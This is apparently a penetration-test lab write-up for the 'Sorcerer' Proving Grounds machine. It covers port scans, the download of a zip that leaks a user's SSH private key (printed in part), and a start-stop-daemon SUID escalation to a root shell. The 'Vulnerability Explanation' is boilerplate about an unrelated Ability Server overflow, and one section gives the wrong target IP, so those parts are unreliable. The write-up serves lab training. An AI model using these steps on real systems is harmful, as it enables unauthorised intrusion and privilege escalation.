# Sorcerer



### 5.1.1 Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.168.100       | **TCP**: 22,80,111,2049,7742,8080,37117,39509,41785,44723




```bash
# Nmap 7.91 scan initiated Sat Mar  5 11:04:53 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sorcerer/results/192.168.168.100/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sorcerer/results/192.168.168.100/scans/xml/_full_tcp_nmap.xml" 192.168.168.100
Increasing send delay for 192.168.168.100 from 0 to 5 due to 612 out of 1529 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of -84428 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -84428 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -299361 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -299361 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -499786 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -499786 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -203436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -203436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -208881 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -208881 microseconds.  Ignoring time.
Nmap scan report for 192.168.168.100
Host is up, received user-set (0.17s latency).
Scanned at 2022-03-05 11:04:55 EST for 877s
Not shown: 65525 closed ports
Reason: 65525 resets
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBPvmCSxPzeOTu0xkhzki1lzln7PMGxSa5pj+POhWbtVKv4FPS1xWMPEoXGBP0mnepAfSnrPFIhT6VWp55a1Li5JZ6lhZnrXlCiGlmXACaBk27AHzN0/oyaOJ3K0i0QzU+WA0yrnYrxwUx9pOiHUHWeMqB2rR0s/qT/HVhIxsCcep3GcnlHZIq+/gDHE8vSE9S7NB0HveWjcK9dTfaGo1j43hexqvWu2HDoaivZASEVaLVuytRNuxncc42YG3+YVJdh0Rc7nzLJGYIZOMf/uL2cQuRnWyZ2cWYp18vKWqdGCx98sLGgvSgvyv8bKodTB3bEjBte67TjB+WH3PHLgwr
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBORL+pLKq3Yihns7IHsQga4FwiEEphsd69rkOSoXG9LpXW1EmBzwAuZsPsFMPybf/wD/1xv3WwXI18OW7KPH5zE=
|   256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+BGOga+rG532zlRWjwPOXuZpULndpYclKxi8sF5n8B
80/tcp    open  http     syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37117/tcp   mountd
|   100005  1,2,3      56333/udp   mountd
|   100021  1,3,4      35320/udp   nlockmgr
|   100021  1,3,4      44723/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
7742/tcp  open  http     syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: SORCERER
8080/tcp  open  http     syn-ack ttl 63 Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.4
37117/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
39509/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
41785/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
44723/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), WatchGuard Fireware 11.8 (91%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (90%), Linux 4.9 (90%), Linux 3.4 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/5%OT=22%CT=1%CU=33690%PV=Y%DS=2%DC=T%G=Y%TM=62238D94
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%TS=A)OPS(O1=M54EST11
OS:NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54E
OS:ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=
OS:40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)
OS:T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.253 days (since Mon Feb 28 05:14:40 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   172.96 ms 192.168.49.1
2   173.07 ms 192.168.168.100

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  5 11:19:32 2022 -- 1 IP address (1 host up) scanned in 878.45 seconds
```

**Web Enumeration**

Upon manual enumeration of the available web services, I noticed that there was a directory `/zipfiles` on the webserver running on port 7742


```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.168.100:7742
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  5 11:22:24 2022
URL_BASE: http://192.168.168.100:7742/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.168.100:7742/ ----
==> DIRECTORY: http://192.168.168.100:7742/default/                                                                                                                    
+ http://192.168.168.100:7742/index.html (CODE:200|SIZE:1219)                                                                                                          
==> DIRECTORY: http://192.168.168.100:7742/zipfiles/                                                                                                                   
                                                                                                                                                                       
---- Entering directory: http://192.168.168.100:7742/default/ ----
+ http://192.168.168.100:7742/default/index.html (CODE:200|SIZE:14)                                                                                                    
                                                                                                                                                                       
---- Entering directory: http://192.168.168.100:7742/zipfiles/ ----
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ^C> Testing: http://192.168.168.100:7742/zipfiles/introduction                                                                                                         
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$       
```


### 5.1.2 Initial Access - Leaked SSH Keys

**Vulnerability Exploited:** Leaked SSH Keys

**System Vulnerable:** 192.168.168.100

**Vulnerability Explanation:**
Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field.
Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
When performing the penetration test, John noticed an outdated version of Ability Server running from the service enumeration phase.
In addition, the operating system was different from the known public exploit.
A rewritten exploit was needed in order for successful code execution to occur.
Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Fix:**
The publishers of the Ability Server have issued a patch to fix this known issue
It can be found here: http://www.code-crafters.com/abilityserver/

**Severity:** Critical

**Steps to Reproduce the attack:**


### 5.1.3 Privilege Escalation - Misconfigured SUID binaries


**Vulnerability Exploited:** 
Misconfigured SUID binaries.

**System Vulnerable:** 10.11.1.217

**Vulnerability Explanation:**
Set UID (SUID) privileges are configured for the `/usr/sbin/start-stop-daemon` binary which allow for a root shell to be made avaliable to the user

**Vulnerability Fix:**
-  Set the permissions of the exploitable binary to not be SUID

**Severity:** Critical


**Exploit:**

Firstly, I transferred a privilege escalation enumeration script, Linux Smart Enumeration, available [here](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh), from my attacker machine to the target machine through a web server. I then ran the script, which identified the SUID binary

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.168.100 - - [05/Mar/2022 12:06:49] "GET /lse.sh HTTP/1.1" 200 -
```

```
cd /tmp
wget 192.168.49.168:8080/lse.sh
--2022-03-05 12:06:49--  http://192.168.49.168:8080/lse.sh
Connecting to 192.168.49.168:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

     0K .......... .......... .......... .......... ..        100%  123K=0.3s

2022-03-05 12:06:49 (123 KB/s) - ‘lse.sh’ saved [43570/43570]

chmod +x lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: max
     User ID: 1003
    Password: none
        Home: /home/max
        Path: /usr/local/bin:/usr/bin:/bin:/usr/games
       umask: 0022

    Hostname: sorcerer
       Linux: 4.19.0-10-amd64
Distribution: Debian GNU/Linux 10 (buster)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/sbin/start-stop-daemon
/usr/bin/vmware-user-suid-wrapper
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip

...
```

Afterwards, I exploited the SUID binary to get a root shell

```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
whoami
root
cd /root
ls
proof.txt
cat proof.txt
d1c983f05d654026bc5d2b14ad371847
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.168.100  netmask 255.255.255.0  broadcast 192.168.168.255
        ether 00:50:56:ba:ba:52  txqueuelen 1000  (Ethernet)
        RX packets 751627  bytes 110744785 (105.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 727796  bytes 355632931 (339.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Post Exploitation

**System Proof Screenshot**

![](Pasted%20image%2020220306011000.png)

# Others

# Enumeration
## nmap

```bash
# Nmap 7.91 scan initiated Sat Mar  5 11:04:53 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sorcerer/results/192.168.168.100/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sorcerer/results/192.168.168.100/scans/xml/_full_tcp_nmap.xml" 192.168.168.100
Increasing send delay for 192.168.168.100 from 0 to 5 due to 612 out of 1529 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of -84428 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -84428 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -299361 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -299361 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -499786 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -499786 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -203436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -203436 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -208881 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -208881 microseconds.  Ignoring time.
Nmap scan report for 192.168.168.100
Host is up, received user-set (0.17s latency).
Scanned at 2022-03-05 11:04:55 EST for 877s
Not shown: 65525 closed ports
Reason: 65525 resets
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBPvmCSxPzeOTu0xkhzki1lzln7PMGxSa5pj+POhWbtVKv4FPS1xWMPEoXGBP0mnepAfSnrPFIhT6VWp55a1Li5JZ6lhZnrXlCiGlmXACaBk27AHzN0/oyaOJ3K0i0QzU+WA0yrnYrxwUx9pOiHUHWeMqB2rR0s/qT/HVhIxsCcep3GcnlHZIq+/gDHE8vSE9S7NB0HveWjcK9dTfaGo1j43hexqvWu2HDoaivZASEVaLVuytRNuxncc42YG3+YVJdh0Rc7nzLJGYIZOMf/uL2cQuRnWyZ2cWYp18vKWqdGCx98sLGgvSgvyv8bKodTB3bEjBte67TjB+WH3PHLgwr
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBORL+pLKq3Yihns7IHsQga4FwiEEphsd69rkOSoXG9LpXW1EmBzwAuZsPsFMPybf/wD/1xv3WwXI18OW7KPH5zE=
|   256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+BGOga+rG532zlRWjwPOXuZpULndpYclKxi8sF5n8B
80/tcp    open  http     syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37117/tcp   mountd
|   100005  1,2,3      56333/udp   mountd
|   100021  1,3,4      35320/udp   nlockmgr
|   100021  1,3,4      44723/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
7742/tcp  open  http     syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: SORCERER
8080/tcp  open  http     syn-ack ttl 63 Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.4
37117/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
39509/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
41785/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
44723/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), WatchGuard Fireware 11.8 (91%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (90%), Linux 4.9 (90%), Linux 3.4 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/5%OT=22%CT=1%CU=33690%PV=Y%DS=2%DC=T%G=Y%TM=62238D94
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%TS=A)OPS(O1=M54EST11
OS:NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54E
OS:ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=
OS:40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)
OS:T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.253 days (since Mon Feb 28 05:14:40 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   172.96 ms 192.168.49.1
2   173.07 ms 192.168.168.100

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  5 11:19:32 2022 -- 1 IP address (1 host up) scanned in 878.45 seconds
```

## 80 - Web
![](Pasted%20image%2020220306001331.png)
![](Pasted%20image%2020220306001340.png)

## 8080 - Web

![](Pasted%20image%2020220306000903.png)
![](Pasted%20image%2020220306000926.png)

## 7742 - Web

![](Pasted%20image%2020220306002147.png)

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.168.100:7742                                                                                                                              130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  5 11:22:24 2022
URL_BASE: http://192.168.168.100:7742/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.168.100:7742/ ----
==> DIRECTORY: http://192.168.168.100:7742/default/                                                                                                                    
+ http://192.168.168.100:7742/index.html (CODE:200|SIZE:1219)                                                                                                          
==> DIRECTORY: http://192.168.168.100:7742/zipfiles/                                                                                                                   
                                                                                                                                                                       
---- Entering directory: http://192.168.168.100:7742/default/ ----
+ http://192.168.168.100:7742/default/index.html (CODE:200|SIZE:14)                                                                                                    
                                                                                                                                                                       
---- Entering directory: http://192.168.168.100:7742/zipfiles/ ----
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ^C> Testing: http://192.168.168.100:7742/zipfiles/introduction                                                                                                         
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$       
```

![](Pasted%20image%2020220306005626.png)

# Exploitation

## SSH Key leaked


```bash
┌──(kali㉿kali)-[~]
└─$ cd /tmp
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wget http://192.168.168.100:7742/zipfiles/max.zip                                                 
--2022-03-05 11:54:15--  http://192.168.168.100:7742/zipfiles/max.zip
Connecting to 192.168.168.100:7742... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8274 (8.1K) [application/zip]
Saving to: ‘max.zip’

max.zip                                   100%[=====================================================================================>]   8.08K  --.-KB/s    in 0s      

2022-03-05 11:54:15 (63.5 MB/s) - ‘max.zip’ saved [8274/8274]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ unzip max.zip                
Archive:  max.zip
   creating: home/max/
  inflating: home/max/.bash_logout   
  inflating: home/max/.profile       
   creating: home/max/.ssh/
  inflating: home/max/.ssh/id_rsa.pub  
  inflating: home/max/.ssh/authorized_keys  
  inflating: home/max/.ssh/id_rsa    
  inflating: home/max/tomcat-users.xml.bak  
  inflating: home/max/.bashrc        
  inflating: home/max/scp_wrapper.sh  
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd home/max/.ssh 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ls -al         
total 20
drwxr-xr-x 2 kali kali 4096 Sep 24  2020 .
drwxr-xr-x 3 kali kali 4096 Sep 24  2020 ..
-rw-r--r-- 1 kali kali  836 Sep 24  2020 authorized_keys
-rw-r--r-- 1 kali kali 3381 Sep 24  2020 id_rsa
-rw-r--r-- 1 kali kali  738 Sep 24  2020 id_rsa.pub
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ssh -i id_rsa max@192.168.168.100             
The authenticity of host '192.168.168.100 (192.168.168.100)' can't be established.
ECDSA key fingerprint is SHA256:1PY83TEUQqDNgXXB6iOOdqU+i3fBhc1zk4eg8yQyiXQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.168.100' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
max@192.168.168.100: Permission denied (publickey).
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ chmod 600 id_rsa                                                                                                                                              255 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ssh -i id_rsa max@192.168.168.100
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
Connection to 192.168.168.100 closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ cat authorized_keys                                                                                                                                             1 ⨯
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ cat id_rsa                     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAt/bdQL2FWSqIZy8+sfdp19nLsDMrirNKlDFvT2vs6WZNoW/2bFCw
SkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj+I2wo2nSd5n2Phua7C2xn3pN72/XayZCdPp
QZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ+5Qfi98UkuwPOEZ4V10BhoYxjXxunqTwf
N8k1eWsA0GX7qWAgEf3+Y68cyNuozOOCrDam9NaciZRZfioDrNaQr174mYtEYAnynmKuek
KOmdM9vULwrkNesK9MeNiAk1Lkfk5L/I3sUTqy83PgBJPnAW2/1hP21W0irKyt8QfQZfVf
bkSU/32jBDSMqWXHoohARsAHE+ZVuedcKnLcIth8CLr9dssi7MGL+7kr0UNSlP49CuMHmT
qgzoNVOPpJRotYrNx7BSq1GbEFLty4ObR5F1rYYLZUTnWtkN94191rFfD92ePona4kzLyZ
7djcAgxKMaYvx1/9qdBuT3YGtfoF3lxXPPPg2chlYOMltXHUkf/o0ypp5bgvARpPoaJHxm
1936vQSHohXmxpyMvqctXuJPKrVky7ho24SJD0tzya4YEs8NqOiF6Jm6XlgjJwFz4Gf8f+
PTiqZB6IEFAKEjcIH3YYJsy89OjFYE/mqdE6O1bE7wSWHUIr/ZJlV7UEKFAgF9G/OH2s1k
EAAAdIBLPUkASz1JAAAAAHc3NoLXJzYQAAAgEAt/bdQL2FWSqIZy8+sfdp19nLsDMrirNK
lDFvT2vs6WZNoW/2bFCwSkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj+I2wo2nSd5n2Phu
a7C2xn3pN72/XayZCdPpQZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ+5Qfi98UkuwPO
EZ4V10BhoYxjXxunqTwfN8k1eWsA0GX7qWAgEf3+Y68cyNuozOOCrDam9NaciZRZfioDrN
aQr174mYtEYAnynmKuekKOmdM9vULwrkNesK9MeNiAk1Lkfk5L/I3sUTqy83PgBJPnAW2/
1hP21W0irKyt8QfQZfVfbkSU/32jBDSMqWXHoohARsAHE+ZVuedcKnLcIth8CLr9dssi7M
GL+7kr0UNSlP49CuMHmTqgzoNVOPpJRotYrNx7BSq1GbEFLty4ObR5F1rYYLZUTnWtkN94
191rFfD92ePona4kzLyZ7djcAgxKMaYvx1/9qdBuT3YGtfoF3lxXPPPg2chlYOMltXHUkf
/o0ypp5bgvARpPoaJHxm1936vQSHohXmxpyMvqctXuJPKrVky7ho24SJD0tzya4YEs8NqO
iF6Jm6XlgjJwFz4Gf8f+PTiqZB6IEFAKEjcIH3YYJsy89OjFYE/mqdE6O1bE7wSWHUIr/Z
JlV7UEKFAgF9G/OH2s1kEAAAADAQABAAACAEljyZaHRQhyaGJJvcg/vNDoyVKsx0UZC7qd
EhvsIWJndrbdtMA3XGzzciCeTPMuatFHEVpS5OA6b1qpP6z4xS/ywngdMRsdhNSr6LNXnu
0KvVFVIwd4SGU7NQ//A1maxLGFuLyy9uwebJcH44aUHNyR3Qoi3LyfqPHzuH9B/cpB1Va/
61SpEYniOM57eOKR4p5dveCHaJa66LAEcibbXj4kYOZcgzXh2YKcdvScHWzhauZjGn48Rx
I/YAvZPFjX/xtioNqTbNI/LJUxfFT4+XChLm/TZ0/etNsSn0vMzqcFNNjctFT/MBwozWw5
